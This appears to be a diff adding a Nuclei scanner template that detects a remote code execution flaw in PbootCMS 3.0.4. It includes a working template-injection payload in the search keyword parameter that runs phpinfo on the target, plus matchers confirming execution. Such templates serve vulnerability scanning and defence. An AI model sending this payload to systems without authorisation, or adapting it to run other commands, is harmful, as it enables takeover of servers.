@@ -1,0 +1,39 @@
+id: pbootcms-rce-cnvd-2021-32163
+info:
+  name: PbootCMS 3.0.4 RCE (CNVD-2021-32163)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    PbootCMS is an open source and free PHP enterprise website development and construction management system.
+    There is a command execution vulnerability in the ParserController.php file of the PbootCMS management system. Attackers can use this vulnerability to execute arbitrary PHP code and gain server permissions.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-32163
+    - https://www.pbootcms.com/changelog
+  tags: rce,php
+
+variables:
+  cmd: "if(([php.info][0])([1][0]));//)"
+
+http:
+  - raw:
+      - |
+        GET /search/?keyword={pboot{user:password}:{{cmd}}}xxx{/pboot:if} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Scanner
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "This program makes use of the Zend Scripting Language Engine:"
+          - "PHP Version"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?s)PHP Version(.*?)www.zend.com"
+        group: 1
